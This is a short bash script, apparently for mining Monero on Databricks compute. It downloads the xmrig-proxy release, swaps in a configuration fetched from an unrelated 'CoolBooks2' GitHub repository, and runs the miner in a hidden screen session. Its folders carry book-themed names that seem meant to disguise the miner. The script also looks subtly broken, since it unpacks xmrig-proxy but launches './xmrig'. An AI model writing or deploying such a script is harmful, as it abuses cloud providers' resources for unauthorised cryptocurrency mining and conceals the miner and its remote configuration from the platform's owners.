#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
sudo apt install screen
clear

cd
mkdir MyBooks
cd MyBooks
wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.15.1/xmrig-proxy-6.15.1-focal-x64.tar.gz

tar xvzf xmrig-proxy-6.15.1-focal-x64.tar.gz
cd xmrig-proxy-6.15.1
rm config.json
wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/P/config.json

screen -R xmr
./xmrig
